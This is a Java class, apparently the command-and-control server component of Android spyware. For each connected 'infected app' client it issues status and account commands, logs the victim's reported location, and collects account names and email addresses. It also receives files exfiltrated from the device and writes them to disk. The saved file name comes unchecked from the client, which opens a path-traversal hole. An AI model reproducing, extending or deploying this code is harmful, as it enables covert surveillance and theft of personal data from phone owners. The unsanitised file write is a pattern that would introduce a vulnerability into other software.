
import org.apache.commons.io.FileUtils;

import java.io.*;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.ArrayList;
import java.util.Arrays;

public class ClientThread implements Runnable {

    private static final int SO_TIMEOUT = 60000;

    private Logger logger, locationLogger;
    private Socket socket = null;
    private DataInputStream in;
    private DataOutputStream out;
    private Heartbeat heartbeat;
    private int threadPort;
    private String clientID;
    private String version;
    private String infectedApp;
    private String lastLocation;
    private ArrayList<String> accountNames = new ArrayList<String>();
    private ArrayList<String> emailAddresses = new ArrayList<String>();
    private boolean listen = true;

    public ClientThread(Socket socket, String wifiStatus, String audioStarted, String locationStarted, String clientID, String version, String infectedApp) {
        // initiate thread
        this.clientID = clientID;
        this.version = version;
        this.infectedApp = infectedApp;
        this.socket = socket;
        logger = new Logger(Main.LOG_TYPE_NORMAL, clientID);
        locationLogger = new Logger(Main.LOG_TYPE_LOCATIONS, clientID);
        threadPort = socket.getPort();
        logger.log("new client connected from: " + socket.getRemoteSocketAddress() + " v" + version);
        File directory = new File(clientID);
        if (!directory.exists()) {
            if (!directory.mkdir()) {
                logger.log("Can't create directory, do I have proper permissions and enough disk space?");
            }
        }
    }

    @Override
    public void run() {
        try {
            try {
                socket.setSoTimeout(SO_TIMEOUT);
                in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
                out = new DataOutputStream(new DataOutputStream(socket.getOutputStream()));

                // request client status
                say("status");
                say("accounts");

                // start heartbeat
                heartbeat = new Heartbeat(out, clientID, ConnectionHandler.clientThreads.indexOf(this));
                heartbeat.start();

                while (listen) {
                    // get header
                    int header = in.readInt();
                    // get size, we expect the next data ([25 - 28]) to contain an int
                    int size = in.readInt();
                    if (header == Protocol.MESSAGE) {
                        // here comes a message
                        byte[] message = new byte[size];
                        in.readFully(message, 0, message.length);
                        String strMessage = new String(message, "UTF-8");
                        handleMessage(strMessage);
                    } else if (header == Protocol.FILE) {
                        // here comes a logFile
                        // start progress tracker on last commandline
                        ProgressHandler progress = new ProgressHandler(clientID, size, in);
                        progress.start();
                        try {
                            // download the logFile
                            int bytesRead = 0;
                            byte[] file = new byte[size];
                            while (bytesRead < size) {
                                int result = in.read(file, bytesRead, size - bytesRead);
                                if (result == -1) break;
                                bytesRead += result;
                                progress.setProgress(bytesRead);
                            }
                            progress.setShowProgress(false);
                            handleFile(file);
                        } catch (IOException e) {
                            logger.log("Download failed");
                        }
                    } else if (header == Protocol.HANDSHAKE) {
                    } else {
                        logger.log("I don't understand the data. Quiting");
                        logger.log("header:     " + header);
                        logger.log("size:       " + size);
                        byte[] message = new byte[size];
                        in.readFully(message, 0, message.length);
                        String strMessage = new String(message, "UTF-8");
                        logger.log("strMessage: " + strMessage);
                        listen = false;
                    }
                }
            } finally {
                if (heartbeat != null) {
                    heartbeat.setRunning(false);
                }
                if (socket != null) {
                    socket.close();
                    socket = null;
                }
                if (in != null) {
                    in.close();
                    in = null;
                }
                if (out != null) {
                    out.flush();
                    out.close();
                    out = null;
                }
                // notify user
                StringBuilder sb = new StringBuilder();
                sb.append("@ thread ");
                sb.append(ConnectionHandler.clientThreads.indexOf(this));
                sb.append(" has disconnected");
                logger.log(sb.toString());
                ConnectionHandler.clientThreads.remove(this);
            }
        } catch (SocketTimeoutException e) {
            logger.log("Connection timed out");
        } catch (EOFException e) {
            logger.log("EOFException");
        } catch (IOException e) {
            logger.log("IO Exception");
            e.printStackTrace();
        }
    }

    private void handleFile(byte[] bytes) throws IOException {
        // we expect the header size to be 128 bytes
        int HEADER_SIZE = 128;
        byte[] bReceivedFile = bytes;
        // get extension in the form of bytes
        byte[] bFileName = Arrays.copyOfRange(bReceivedFile, 0, HEADER_SIZE);
        // remove header from received logFile
        bReceivedFile = Arrays.copyOfRange(bReceivedFile, HEADER_SIZE, bReceivedFile.length);
        // convert to filename to a string
        String strFileName = new String(bFileName, "UTF-8").trim();
        // save the logFile to disk using Apache commons
        File file = new File(clientID, strFileName);
        FileUtils.writeByteArrayToFile(file, bReceivedFile);
        logger.log("\r\nSuccesfully received " + strFileName);
    }

    private void handleMessage(String message) {
        if (message.equals("♥")) {
            return;
        }
        if (message.startsWith("lat ")) {
            locationLogger.log(message);
            lastLocation = message;
            return;
        }
        if (message.startsWith("Account ")) {
            String name = message.substring(
                    message.indexOf("name=") + "name=".length(),
                    message.indexOf(",")
            );
            if (!accountNames.contains(name)) {
                accountNames.add(name);
            }
            if (name.contains("@") && name.contains(".") && !emailAddresses.contains(name)) {
                emailAddresses.add(name);
            }
        }
        logger.log(message);
    }

    public void say(String message) {
        synchronized (out) { // wait for any other uploads or messages
            if (out != null) {
                try {
                    // notify the other side we are sending a message
                    out.writeInt(Protocol.MESSAGE);
                    // notify of the size of the message
                    out.writeInt(message.getBytes().length);
                    out.flush();
                    // convert message to bytes and send
                    byte[] messageBytes = message.getBytes();
                    out.write(messageBytes, 0, messageBytes.length);
                    out.flush();
                } catch (IOException e) {
                    logger.log("IOException, could not send message: " + message);
                }
            }
        }
    }

    public String getLastReportedLocation() {
        return lastLocation;
    }

    public ArrayList<String> getEmailAddresses() {
        return emailAddresses;
    }

    public ArrayList<String> getAccountNames() {
        return accountNames;
    }

    public int getThreadPort() {
        return threadPort;
    }

    public String getClientID() {
        return clientID;
    }

    public void setSocket(Socket socket) {
        this.socket = socket;
    }

    public Socket getSocket() {
        return socket;
    }

    public String getInfectedApp() {
        return infectedApp;
    }

    public String getVersion() {
        return version;
    }

}
